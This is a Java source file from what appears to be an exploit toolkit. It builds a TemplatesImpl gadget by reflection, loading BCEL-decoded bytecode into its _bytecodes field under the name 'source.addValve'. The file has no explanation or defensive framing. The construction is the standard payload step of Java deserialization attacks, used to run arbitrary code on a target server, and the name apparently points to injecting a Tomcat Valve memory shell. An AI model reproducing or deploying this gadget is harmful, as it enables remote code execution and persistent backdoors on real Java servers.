package source;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;


import java.lang.reflect.Field;
public class GetTemplateImpl {
    public GetTemplateImpl() {
    }

    public TemplatesImpl GetTemplateImpl_(String codes) throws Exception{
        byte[] decode = com.sun.org.apache.bcel.internal.classfile.Utility.decode(codes,false);
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        TemplatesImpl o = (TemplatesImpl)aClass.newInstance();
        setFieldValue(o,"_name","source.addValve");
        setFieldValue(o,"_bytecodes",new byte[][]{decode});
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
        setFieldValue(o,"_tfactory",(TransformerFactoryImpl)aClass1.newInstance());
        return o;
        //o.newTransformer();
    }

    public static void setFieldValue(Object obj, String FieldName, Object setObj){
        try {
            Field field = obj.getClass().getDeclaredField(FieldName);
            field.setAccessible(true);
            field.set(obj,setObj);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
